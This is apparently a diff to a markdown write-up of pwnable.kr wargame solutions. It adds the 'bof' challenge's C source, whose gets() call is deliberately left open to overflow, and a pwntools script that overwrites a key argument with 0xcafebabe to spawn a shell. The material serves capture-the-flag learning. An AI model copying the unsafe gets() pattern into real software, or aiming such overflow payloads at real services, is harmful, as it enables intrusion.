@@ -22,7 +22,7 @@ int main(int argc, char* argv[], char* envp[]){
 	printf("learn about Linux file IO\n");
 	return 0;
 
-}
+}`
 ```
 0x1234 = 4660, 0 is fd for stdin
 ```bash
@@ -84,5 +84,49 @@ read_lines(p, 1)
 p.interactive()
 ```
 
+<hr>
 
+## bof
 
+#### Code:
+```c
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+void func(int key){
+	char overflowme[32];
+	printf("overflow me : ");
+	gets(overflowme);	// smash me!
+	if(key == 0xcafebabe){
+		system("/bin/sh");
+	}
+	else{
+		printf("Nah..\n");
+	}
+}
+int main(int argc, char* argv[]){
+	func(0xdeadbeef);
+	return 0;
+}
+```
+#### Solution:
+```python
+# Currently I have only tested this code locally because pwnable.kr:9000 is down.
+
+from pwn import *
+
+def read_lines(p, count, decode = True):
+    lines = []
+    for _ in range(count):
+        lines.append(p.recvline().decode('utf8', errors='replace') if decode else p.recvline())
+    print("\n".join(lines))
+
+p = remote("pwnable.kr", 9000)
+# p = process("./bof")    
+
+read_lines(p, 1)
+payload = b"A"*32 + b"A" * 4 + b"A" * 16 + b"\xbe\xba\xfe\xca" # little-endian of 0xcafebabe
+p.sendline(payload)
+
+p.interactive()
+```
